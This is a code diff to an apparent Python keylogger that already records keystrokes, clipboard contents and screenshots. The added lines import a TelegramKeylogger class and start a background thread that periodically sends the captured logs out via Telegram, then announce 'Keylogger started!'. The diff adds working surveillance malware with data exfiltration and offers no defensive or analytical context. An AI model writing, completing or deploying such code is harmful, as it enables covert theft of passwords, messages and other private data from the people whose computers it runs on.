@@ -4,6 +4,8 @@ import time
 from pynput import keyboard
 import pyautogui
 import os
+from pynput.keyboard import Key, Listener
+from KeyloggerManager import TelegramKeylogger
 
 try:
     import win32api
@@ -152,6 +154,7 @@ def on_release(key):
     elif key == keyboard.Key.alt or key == keyboard.Key.alt_r:
         alt_pressed = False
     if key == keyboard.Key.esc:
+        keylogger_manager.stop()
         return False
 
 def clipboard_monitor(interval=5):
@@ -188,6 +191,13 @@ logger.info(f"PROGRAM_STARTED | Initial layout: {current_layout}")
 threading.Thread(target=clipboard_monitor, daemon=True).start()
 threading.Thread(target=screenshot_monitor, daemon=True).start()
 threading.Thread(target=check_alt_shift_in_log, daemon=True).start()
+
+keylogger_manager = TelegramKeylogger()
+send_thread = threading.Thread(target=keylogger_manager.auto_send_loop)
+send_thread.daemon = True
+send_thread.start()
+
+print(f"Keylogger started! Sending logs every {keylogger_manager.send_interval} seconds")
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
